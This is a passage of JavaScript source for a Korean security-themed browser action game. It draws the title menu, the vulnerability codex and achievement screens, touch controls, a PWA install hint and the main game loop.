    ctx.fillText('“' + R.comment + '”', 0, 142);
    // 학습 요약
    ctx.font = `13px ${FONT}`; ctx.fillStyle = '#80deea';
    const names = game.learned.map((l) => (l.kind === 'base' ? l.data.keeper : l.data.name)).join(' · ');
    if (names) for (const [i, l] of wrapText('오늘 배운 것: ' + names, 760).entries()) { if (i < 2) ctx.fillText(l, 0, 170 + i * 18); }
    // 오늘의 오답노트
    if (game.wrongToday.length) {
      ctx.font = `bold 13px ${FONT}`; ctx.fillStyle = '#ff8a80'; ctx.fillText('📕 오늘의 오답 (다음 판에 다시 출제)', 0, 214);
      ctx.font = `12px ${FONT}`; ctx.fillStyle = '#ffccbc';
      game.wrongToday.slice(0, 3).forEach((w, i) => ctx.fillText(`Q. ${w.q.slice(0, 40)}${w.q.length > 40 ? '…' : ''}  →  A. ${w.a}`, 0, 234 + i * 18));
    }
    ctx.font = `bold 16px ${FONT}`; ctx.fillStyle = '#ffd54f';
    if (team.saveMsg) { ctx.font = `bold 14px ${FONT}`; ctx.fillStyle = '#80deea'; ctx.fillText(team.saveMsg, 0, 284); ctx.font = `bold 16px ${FONT}`; ctx.fillStyle = '#ffd54f'; }
    ctx.fillText(touch.on ? '◀ 왼쪽 탭: 다시 출근   ·   오른쪽 탭: 타이틀 ▶' : 'R 다시 출근   ·   ENTER 타이틀', 0, 310);
    hitRect(0, 0, W / 2, H, () => { pressed.KeyR = true; }); hitRect(W / 2, 0, W / 2, H, () => { pressed.Enter = true; });
  }
  ctx.restore();
}

// ── 타이틀 ──
const titleMobs = Array.from({ length: 40 }, () => ({ type: pick(['bug', 'worm', 'virus', 'trojan', 'botnet', 'rootkit', 'ransom']), x: Math.random(), y: Math.random(), v: rand(0.01, 0.04), a: rand(0, TAU) }));
function drawTitle() {
  const T = game.titleT;
  ctx.save(); ctx.translate(-(T * 20) % 256, -(T * 10) % 256); ctx.fillStyle = floorPat; ctx.fillRect(0, 0, W + 512, H + 512); ctx.restore();
  ctx.globalAlpha = 0.5;
  for (const m of titleMobs) {
    m.x = (m.x + m.v * 0.016) % 1.1; const s = SPR[m.type].n;
    ctx.save(); ctx.translate(m.x * W * 1.1 - 40, m.y * H); ctx.rotate(Math.sin(T + m.a) * 0.3); ctx.drawImage(s, -s.width / 4, -s.height / 4, s.width / 2, s.height / 2); ctx.restore();
  }
  ctx.globalAlpha = 1;
  const vg = ctx.createRadialGradient(W / 2, H / 2, 50, W / 2, H / 2, Math.max(W, H) * 0.7);
  vg.addColorStop(0, 'rgba(0,0,0,0.3)'); vg.addColorStop(1, 'rgba(0,0,0,0.9)'); ctx.fillStyle = vg; ctx.fillRect(0, 0, W, H);
  const s = clamp(Math.min(W / 1200, H / 820), 0.3, 1.3);
  titleScale = s;
  ctx.save(); ctx.translate(W / 2, 0); ctx.scale(s, s);
  if (game.menuMode === 'codex') { drawCodexScreen(s); ctx.restore(); if (touch.on) drawBackButton(); return; }
  if (game.menuMode === 'ach') { drawAchScreen(); ctx.restore(); if (touch.on) drawBackButton(); return; }
  if (game.menuMode === 'rank') { drawRankScreen(); ctx.restore(); if (touch.on) drawBackButton(); return; }
  ctx.textAlign = 'center';
  const gl = Math.sin(T * 13) > 0.93 ? rand(-6, 6) : 0;
  ctx.font = `120px ${FONT_BIG}`;
  ctx.fillStyle = '#ff1744'; ctx.fillText('보안무쌍', 4 + gl, 184);
  ctx.fillStyle = '#00e5ff'; ctx.fillText('보안무쌍', -4 - gl, 180);
  ctx.fillStyle = '#fff'; ctx.fillText('보안무쌍', 0, 182);
  ctx.font = `bold 20px ${FONT_MONO}`; ctx.fillStyle = '#ffd54f';
  ctx.fillText('SECURITY MUSOU — 1 vs 10,000 THREATS', 0, 222);
  ctx.font = `16px ${FONT}`; ctx.fillStyle = '#b0bec5';
  ctx.fillText('야근에 지친 보안담당자, 거대 키보드를 들다. 취약점을 쓸어버리며 배우는 스트레스 해소 무쌍', 0, 252);
  const m = MENU(), nd = DIFFS.length;
  ctx.font = `14px ${FONT_BIG}`; ctx.fillStyle = '#80deea'; ctx.textAlign = 'left';
  ctx.fillText('▶ 출근 (모드 선택)', -470, 284); ctx.fillText('⚙ 준비 · 학습', 10, 284);
  m.forEach((it, i) => {
    const col = i < nd ? 0 : 1, row = col ? i - nd : i;
    const x0 = col ? 10 : -470, y = 318 + row * (col ? 40 : 50), sel = i === game.menuIdx, bw = 460, bh = col ? 35 : 42, by = col ? y - 24 : y - 28;
    ctx.fillStyle = sel ? 'rgba(0,229,255,0.18)' : 'rgba(255,255,255,0.04)'; rr(ctx, x0, by, bw, bh, 9); ctx.fill();
    if (sel) { ctx.strokeStyle = '#00e5ff'; ctx.lineWidth = 2; rr(ctx, x0, by, bw, bh, 9); ctx.stroke(); }
    hitT(s, W / 2, 0, x0, by, bw, bh, () => { game.menuIdx = i; pressed.Enter = true; });
    ctx.textAlign = 'left'; ctx.font = `19px ${FONT_BIG}`; ctx.fillStyle = sel ? '#fff' : '#b0bec5';
    let label, desc;
    if (it.kind === 'diff') { label = `${i + 1}. ${it.d.name}`; desc = it.d.desc; }
    else if (it.kind === 'weapon') { label = `⚔ ${curWeapon().name}`; desc = `해금 ${WEAPONS.filter(isUnlocked).length}/${WEAPONS.length} · ENTER 교체`; }
    else if (it.kind === 'level') { label = `🎓 학습 난이도: ${LEVELS[(settings.level || 1) - 1]}`; desc = '점검·로그 문제 수준'; }
    else if (it.kind === 'switch') { label = `⌨ ${(SWITCHES.find((x) => x[0] === (settings.sw || 'blue')) || SWITCHES[0])[1]}`; desc = '타격음 축 변경'; }
    else if (it.kind === 'quiz') { label = `❓ 학습 퀴즈: ${settings.quiz ? quizFreq().label : 'OFF'}`; desc = !settings.quiz ? '카드만 잠깐 표시' : settings.quizFreq === 'often' ? '최소 30초 간격 · 복습 포함' : '최소 90초 간격 · 처음 본 것만'; }
    else if (it.kind === 'ach') { label = `🏆 업적 ${Object.keys(achGot).length}/${ACHS.length}`; desc = '업적 · 무기 해금 조건'; }
    else if (it.kind === 'cvepack') { const pm = packMonth(), n = CT.cves.filter((c) => c.kev).length; label = `🆕 이달의 신규 CVE: ${newCveOn() ? 'ON' : 'OFF'}`; desc = n ? `KEV 월간 팩 ${n}개 (최신 ${pm})` : '월간 팩 없음'; }
    else if (it.kind === 'rank') { label = '🏅 보안팀 랭킹'; desc = team.status === 'ready' ? `${team.docs.length}명 참여${myTeamRank('score') ? ` · 나 ${myTeamRank('score')}위` : ''}` : team.status === 'local' ? '공유 페이지에서 활성화' : '불러오는 중…'; }
    else { label = '📘 보안 도감'; desc = `수집 ${codexCount('all')}/${codexList().length} · 오답 ${Object.keys(wrongNote).length}`; }
    ctx.fillText(label, x0 + 16, y);
    ctx.font = `13px ${FONT}`; ctx.fillStyle = '#90a4ae'; ctx.textAlign = 'right'; ctx.fillText(desc, x0 + bw - 14, y - 1);
  });
  ctx.textAlign = 'center'; ctx.font = `bold 15px ${FONT}`; ctx.fillStyle = '#ffd740';
  const dc = cveList()[dailyIdx()];
  const lm = latestMonth(), nNew = lm ? cveList().filter((c) => c.month === lm).length : 0;
  ctx.fillText(`★ 오늘의 CVE: ${dc.name} (${dc.cve}) — 격파 시 보너스${nNew ? `   ·   🆕 이달의 신규 CVE ${nNew}개 (CISA KEV ${lm})` : ''}`, 0, 642);
  ctx.textAlign = 'center';
  const tips = CT.tips.length ? CT.tips : DEFAULT_CONTENT.tips;
  ctx.font = `15px ${FONT}`; ctx.fillStyle = '#80deea';
  ctx.fillText('TIP · ' + tips[Math.floor(T / 5) % tips.length], 0, 668);
  // 조작법
  ctx.font = `14px ${FONT}`; ctx.fillStyle = '#cfd8dc';
  if (touch.on) {
    ctx.fillText('터치 조작: 왼쪽을 누른 채 끌어 이동  ·  오른쪽 버튼으로 공격·강공·대시·무쌍·터미널  ·  오른쪽 빈 곳 탭 = 연타', 0, 698);
    ctx.fillText(H > W ? '📱 가로 화면으로 돌리면 더 넓게 보입니다  ·  메뉴는 탭해서 선택' : '메뉴는 탭해서 선택  ·  강공격: 공격 몇 번 후 강공 = 파생기', 0, 720);
  } else {
  ctx.fillText('W/S 전후 · A/D 옆걸음 · ←→ 시점 회전 (화면 클릭 = 마우스 시점)  ·  J 약공격(5연타) · K 강공격(J n회 후 K = 파생기) · L/Shift 대시', 0, 698);
  ctx.fillText('SPACE 무쌍 난무  ·  E 긴급 터미널: 보안 명령어 타이핑 필살기  ·  V 시점 전환(3인칭/1인칭/쿼터뷰/2D)  ·  ESC 일시정지  ·  M 소리', 0, 720);
  }
  ctx.font = `13px ${FONT}`; ctx.fillStyle = '#607d8b';
  ctx.fillText(`↑↓←→ 선택 · ENTER 시작/변경 · 숫자 1~5 바로 시작 · 게임 중 숫자키 = 무기 교체     최고기록 ${fmt(bestRec.ko)} KO / ${fmt(bestRec.combo)} HITS`, 0, 752);
  ctx.restore();
}
function drawAchScreen() {
  ctx.textAlign = 'center'; ctx.font = `46px ${FONT_BIG}`; ctx.fillStyle = '#ffd740'; ctx.fillText('🏆 업적 · 무기', 0, 80);
  ctx.font = `14px ${FONT}`; ctx.fillStyle = '#90a4ae'; ctx.fillText('ESC / ENTER 돌아가기', 0, 106);
  ACHS.forEach(([id, name, desc], i) => {
    const got = !!achGot[id], y = 150 + i * 30;
    ctx.textAlign = 'left'; ctx.font = `15px ${FONT}`; ctx.fillStyle = got ? '#ffd740' : '#546e7a';
    ctx.fillText(`${got ? '🏆' : '🔒'} ${name}`, -540, y); ctx.fillStyle = got ? '#cfd8dc' : '#455a64'; ctx.fillText(desc, -320, y);
  });
  ctx.textAlign = 'left'; ctx.font = `20px ${FONT_BIG}`; ctx.fillStyle = '#b2ff59'; ctx.fillText('⚔ 무기 (도감을 모으면 해금)', 90, 150);
  WEAPONS.forEach((w, i) => {
    const ok = isUnlocked(w), y = 190 + i * 62;
    ctx.fillStyle = ok ? 'rgba(178,255,89,0.1)' : 'rgba(255,255,255,0.03)'; rr(ctx, 90, y - 24, 460, 54, 8); ctx.fill();
    ctx.font = `bold 16px ${FONT}`; ctx.fillStyle = ok ? '#fff' : '#607d8b'; ctx.fillText(`${i + 1}. ${w.name}${curWeapon() === w ? '  (장착 중)' : ''}`, 104, y);
    ctx.font = `13px ${FONT}`; ctx.fillStyle = ok ? '#b2ff59' : '#78909c';
    ctx.fillText(ok ? w.desc : `🔒 ${w.need.text} 필요 (현재 ${codexCount(w.need.kind)}/${w.need.n})`, 104, y + 20);
  });
}
function drawCodexScreen() {
  const all = codexList(), cur = all[game.codexIdx];
  ctx.textAlign = 'center'; ctx.font = `48px ${FONT_BIG}`; ctx.fillStyle = '#ffd54f'; ctx.fillText('📘 취약점 도감', 0, 80);
  ctx.font = `14px ${FONT}`; ctx.fillStyle = '#90a4ae'; ctx.fillText('↑↓ 이동 · ESC/ENTER 돌아가기 · 전투에서 격파하면 해금됩니다', 0, 108);
  all.forEach((it, i) => {
    const y = 140 + i * 25, sel = i === game.codexIdx, seen = codexSeen[it.id];
    ctx.fillStyle = sel ? 'rgba(255,213,79,0.18)' : 'rgba(255,255,255,0.04)'; rr(ctx, -560, y - 18, 300, 23, 5); ctx.fill();
    hitT(titleScale, W / 2, 0, -560, y - 18, 300, 23, () => { game.codexIdx = i; });
    ctx.textAlign = 'left'; ctx.font = `14px ${FONT}`; ctx.fillStyle = seen ? (it.kind === 'base' ? '#80deea' : it.kind === 'malware' ? '#ffd54f' : '#ff8a80') : '#455a64';
    ctx.fillText((seen ? '' : '🔒 ') + (it.data.kev ? '🆕 ' : '') + (it.kind === 'base' ? it.data.keeper : it.data.name), -548, y - 2);
  });
  ctx.fillStyle = '#0b1324'; rr(ctx, -230, 130, 790, 600, 14); ctx.fill();
  ctx.strokeStyle = 'rgba(255,213,79,0.4)'; ctx.lineWidth = 1.5; rr(ctx, -230, 130, 790, 600, 14); ctx.stroke();
  if (codexSeen[cur.id]) {
    let yy = drawCard(cur, -200, 172, 730);
    const q = cur.data.quiz;
    if (q) {
      yy += 20; ctx.font = `bold 15px ${FONT}`; ctx.fillStyle = '#ffd54f'; ctx.fillText('Q. ' + q.q, -200, yy); yy += 24;
      ctx.font = `14px ${FONT}`; ctx.fillStyle = '#69f0ae'; ctx.fillText('A. ' + q.choices[q.answer], -200, yy); yy += 22;
      ctx.fillStyle = '#b0bec5'; for (const l of wrapText(q.explain, 730)) { ctx.fillText(l, -200, yy); yy += 20; }
    }
  } else {
    ctx.textAlign = 'center'; ctx.font = `28px ${FONT_BIG}`; ctx.fillStyle = '#455a64'; ctx.fillText('🔒 미해금', 165, 400);
    ctx.font = `15px ${FONT}`; ctx.fillText(cur.kind === 'base' ? '해당 거점의 거점관리자를 격파하세요' : cur.kind === 'malware' ? '이 유형의 적을 처음 처치하면 해금됩니다' : '전투 중 등장하는 적장(CVE)을 격파하세요', 165, 436);
  }
}


// ═════════════════════ 홈 화면 앱 설치 (PWA) ═════════════════════
let installPrompt = null;
window.addEventListener('beforeinstallprompt', (e) => { e.preventDefault(); installPrompt = e; });
window.addEventListener('appinstalled', () => { installPrompt = null; });
const isStandalone = () => (window.matchMedia && (matchMedia('(display-mode: standalone)').matches || matchMedia('(display-mode: fullscreen)').matches)) || navigator.standalone === true;
const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
const canInstallHere = () => /^https?:$/.test(location.protocol) && !(window.parent !== window); // Artifact(iframe) 안에선 설치 불가
async function doInstall() {
  const p = installPrompt; if (!p) return;
  installPrompt = null;
  try { p.prompt(); await p.userChoice; } catch (e) { /* 사용자가 닫음 */ }
}
function drawInstallHint() { // 타이틀 오른쪽 위
  if (isStandalone() || !canInstallHere()) return;
  ctx.setTransform(DPR, 0, 0, DPR, 0, 0);
  if (installPrompt) {
    const w = 168, h = 40, x = W - w - 14, y = 14;
    ctx.fillStyle = '#00bcd4'; rr(ctx, x, y, w, h, 10); ctx.fill();
    ctx.fillStyle = '#04141a'; ctx.font = `bold 15px ${FONT}`; ctx.textAlign = 'center'; ctx.fillText('📲 앱으로 설치', x + w / 2, y + 26);
    hitRect(x, y, w, h, doInstall);
  } else if (isIOS) {
    ctx.font = `13px ${FONT}`; ctx.textAlign = 'right'; ctx.fillStyle = 'rgba(178,235,242,0.85)';
    ctx.fillText('📲 홈 화면에 설치: Safari 공유 버튼 → "홈 화면에 추가"', W - 14, 28);
  }
}

// ═════════════════════ 터치 조작 (휴대폰·태블릿) ═════════════════════
// 왼쪽: 닿는 곳에 생기는 가상 조이스틱 · 오른쪽: 공격 버튼 (빈 곳 탭 = 약공격)
// 메뉴·퀴즈·결과 화면은 그릴 때 등록한 탭 영역(touchHits)으로 처리
const touch = { on: false, joy: null, jx: 0, jy: 0, held: new Map(), input: null };
let touchHits = [];
let titleScale = 1;
const hitRect = (x, y, w, h, act) => { touchHits.push({ x, y, w, h, act }); };
const hitT = (sc, ox, oy, x, y, w, h, act) => hitRect(ox + x * sc, oy + y * sc, w * sc, h * sc, act);
function touchLayout() {
  const u = clamp(Math.min(W, H) / 6.2, 50, 92);
  return [
    { code: 'KeyJ', label: '공격', x: W - u * 1.0, y: H - u * 1.0, r: u * 0.62 },
    { code: 'KeyK', label: '강공', x: W - u * 2.3, y: H - u * 0.8, r: u * 0.46 },
    { code: 'KeyL', label: '대시', x: W - u * 0.95, y: H - u * 2.35, r: u * 0.44 },
    { code: 'Space', label: '무쌍', x: W - u * 2.2, y: H - u * 2.05, r: u * 0.44, gauge: () => player.musou >= 100 },
    { code: 'KeyE', label: '터미널', x: W - u * 3.5, y: H - u * 0.8, r: u * 0.42, gauge: () => player.term >= 100 },
    { code: 'Escape', label: 'II', x: W - u * 0.45, y: u * 2.1, r: u * 0.32 },
  ];
}
function enableTouchUI() {
  touch.on = true;
  // 휴대폰은 주변이 다 보이는 쿼터뷰(이동 = 화면 방향)가 자연스럽다. 이번 접속에만 적용(저장 안 함).
  if (window.R3D && window.R3D.enabled && window.R3D.mode !== 'tps') window.R3D.mode = 'tps';
  ensureTypingInput();
}
function ensureTypingInput() {
  if (touch.input) return touch.input;
  const el = document.createElement('input');
  el.type = 'text'; el.autocomplete = 'off'; el.spellcheck = false;
  el.setAttribute('autocapitalize', 'off'); el.setAttribute('autocorrect', 'off'); el.setAttribute('enterkeyhint', 'send');
  el.setAttribute('aria-label', '터미널 명령 입력');
  Object.assign(el.style, { position: 'fixed', left: '0', bottom: '0', width: '1px', height: '1px', opacity: '0', fontSize: '16px', border: '0', padding: '0', zIndex: '-1' });
  document.body.appendChild(el);
  el.addEventListener('input', () => {
    const v = el.value; el.value = '';
    for (const ch of v) {
      if (/[ㄱ-ㅎㅏ-ㅣ가-힣]/.test(ch)) { imeWarnT = 3; continue; }
      if (game.typing) handleTypingKey({ key: ch, keyCode: 0, preventDefault() {} });
    }
  });
  el.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') { e.preventDefault(); if (game.typing) handleTypingKey({ key: 'Enter', keyCode: 13, preventDefault() {} }); }
  });
  touch.input = el;
  return el;
}
function focusTypingInput() { const el = ensureTypingInput(); try { el.focus({ preventScroll: true }); } catch (e) { el.focus(); } }
function tpos(t) { const r = cv.getBoundingClientRect(); return { x: t.clientX - r.left, y: t.clientY - r.top }; }
function hitAt(pt) { for (let i = touchHits.length - 1; i >= 0; i--) { const h = touchHits[i]; if (pt.x >= h.x && pt.x <= h.x + h.w && pt.y >= h.y && pt.y <= h.y + h.h) return h; } return null; }
function onTouchStart(id, pt) {
  const h = hitAt(pt);
  if (game.state === 'play' && !game.overlay && !game.typing) {
    if (h) { h.act(); return; } // HUD 무기 바 등
    for (const b of touchLayout()) {
      if (Math.hypot(pt.x - b.x, pt.y - b.y) < b.r * 1.2) {
        if (b.code === 'KeyE' && player.term >= 100) focusTypingInput(); // 키보드는 탭 순간에만 열 수 있음
        pressed[b.code] = true; keys[b.code] = true; touch.held.set(id, b.code);
        return;
      }
    }
    if (pt.x < W * 0.45) { if (!touch.joy) { touch.joy = { id, x: pt.x, y: pt.y, cx: pt.x, cy: pt.y }; touch.jx = touch.jy = 0; } return; }
    pressed.KeyJ = true; keys.KeyJ = true; touch.held.set(id, 'KeyJ'); // 오른쪽 빈 곳 = 약공격 연타
    return;
  }
  if (h) { h.act(); return; }
  if (game.state === 'play' && game.typing) focusTypingInput();
}
function onTouchMove(id, pt) {
  const j = touch.joy; if (!j || j.id !== id) return;
  const R = clamp(Math.min(W, H) / 6.2, 50, 92) * 0.9;
  let dx = pt.x - j.x, dy = pt.y - j.y; const d = Math.hypot(dx, dy);
  if (d > R) { dx = dx / d * R; dy = dy / d * R; }
  j.cx = j.x + dx; j.cy = j.y + dy; touch.jx = dx / R; touch.jy = dy / R;
}
function onTouchEnd(id) {
  if (touch.joy && touch.joy.id === id) { touch.joy = null; touch.jx = touch.jy = 0; }
  const code = touch.held.get(id);
  if (code) { touch.held.delete(id); if (![...touch.held.values()].includes(code)) keys[code] = false; }
}
cv.addEventListener('touchstart', (e) => {
  e.preventDefault(); audio.init();
  if (!touch.on) enableTouchUI();
  for (const t of e.changedTouches) onTouchStart(t.identifier, tpos(t));
}, { passive: false });
cv.addEventListener('touchmove', (e) => { e.preventDefault(); for (const t of e.changedTouches) onTouchMove(t.identifier, tpos(t)); }, { passive: false });
cv.addEventListener('touchend', (e) => { e.preventDefault(); for (const t of e.changedTouches) onTouchEnd(t.identifier); }, { passive: false });
cv.addEventListener('touchcancel', (e) => { for (const t of e.changedTouches) onTouchEnd(t.identifier); });

function drawTouchUI() {
  ctx.setTransform(DPR, 0, 0, DPR, 0, 0);
  const R = clamp(Math.min(W, H) / 6.2, 50, 92) * 0.9;
  ctx.textAlign = 'center'; ctx.textBaseline = 'middle';
  if (touch.joy) {
    const j = touch.joy;
    ctx.fillStyle = 'rgba(255,255,255,0.10)'; ctx.beginPath(); ctx.arc(j.x, j.y, R, 0, TAU); ctx.fill();
    ctx.strokeStyle = 'rgba(0,229,255,0.5)'; ctx.lineWidth = 2; ctx.stroke();
    ctx.fillStyle = 'rgba(0,229,255,0.55)'; ctx.beginPath(); ctx.arc(j.cx, j.cy, R * 0.42, 0, TAU); ctx.fill();
  } else {
    const gx = Math.min(W * 0.16, R * 1.6), gy = H - R * 1.4;
    ctx.strokeStyle = 'rgba(255,255,255,0.18)'; ctx.lineWidth = 2; ctx.setLineDash([6, 6]); ctx.beginPath(); ctx.arc(gx, gy, R, 0, TAU); ctx.stroke(); ctx.setLineDash([]);
    ctx.font = `bold 13px ${FONT}`; ctx.fillStyle = 'rgba(255,255,255,0.35)'; ctx.fillText('이동', gx, gy);
  }
  for (const b of touchLayout()) {
    const down = keys[b.code], ready = b.gauge ? b.gauge() : true;
    ctx.fillStyle = down ? 'rgba(0,229,255,0.45)' : b.gauge && !ready ? 'rgba(255,255,255,0.06)' : 'rgba(255,255,255,0.14)';
    ctx.beginPath(); ctx.arc(b.x, b.y, b.r, 0, TAU); ctx.fill();
    ctx.lineWidth = b.gauge && ready ? 3 : 1.5;
    ctx.strokeStyle = b.gauge && ready ? `hsla(${45 + Math.sin(game.titleT * 8) * 10},100%,60%,0.95)` : 'rgba(255,255,255,0.35)';
    ctx.stroke();
    if (b.gauge && !ready) { // 게이지 진행률
      const v = b.code === 'Space' ? player.musou / 100 : player.term / 100;
      ctx.strokeStyle = 'rgba(0,229,255,0.7)'; ctx.lineWidth = 3; ctx.beginPath(); ctx.arc(b.x, b.y, b.r - 3, -Math.PI / 2, -Math.PI / 2 + TAU * v); ctx.stroke();
    }
    ctx.font = `${b.code === 'KeyJ' ? 'bold ' : ''}${Math.round(b.r * 0.42)}px ${FONT}`;
    ctx.fillStyle = b.gauge && !ready ? 'rgba(255,255,255,0.4)' : '#fff';
    ctx.fillText(b.label, b.x, b.y);
  }
  ctx.textBaseline = 'alphabetic';
}
function drawBackButton() {
  ctx.setTransform(DPR, 0, 0, DPR, 0, 0);
  ctx.fillStyle = 'rgba(255,255,255,0.12)'; rr(ctx, 14, 14, 96, 42, 10); ctx.fill();
  ctx.font = `bold 16px ${FONT}`; ctx.fillStyle = '#fff'; ctx.textAlign = 'center'; ctx.fillText('◀ 뒤로', 62, 41);
  hitRect(14, 14, 96, 42, () => { pressed.Escape = true; });
}
function cycleWeapon() {
  const cur = WEAPONS.indexOf(curWeapon());
  for (let k = 1; k <= WEAPONS.length; k++) { const i = (cur + k) % WEAPONS.length; if (isUnlocked(WEAPONS[i])) { equipWeapon(i); return; } }
}

// ───────────────────────── 메인 루프 ─────────────────────────
let last = performance.now();
const perf = { u: 0, r: 0 };
function frame(now) {
  const dt = Math.min(0.05, (now - last) / 1000);
  last = now;
  try {
    const t0 = performance.now(); update(dt);
    const t1 = performance.now(); render();
    const t2 = performance.now();
    perf.u = perf.u * 0.9 + (t1 - t0) * 0.1; perf.r = perf.r * 0.9 + (t2 - t1) * 0.1;
  }
  catch (err) { console.error(err); }
  requestAnimationFrame(frame);
}
requestAnimationFrame(frame);
cv.focus();
// 디버그·테스트용 핸들
window.__SECMUSOU__ = {
  game, player, CT, newGame, DIFFS, spawnBoss, perf, team, touch, touchLayout, onTouchStart, onTouchMove, onTouchEnd, touchHits: () => touchHits, codexSeen, settings, WEAPONS, MISSION, achGot, wrongNote, stats, equipWeapon, curWeapon, render: () => render(),
  // 테스트용: 실제 프레임과 무관하게 게임 루프를 n프레임 진행 (키 입력은 press 배열로 주입)
  step(n = 1, dt = 1 / 60, press = []) { for (let i = 0; i < n; i++) { for (const c of press) pressed[c] = true; update(dt); } },
};
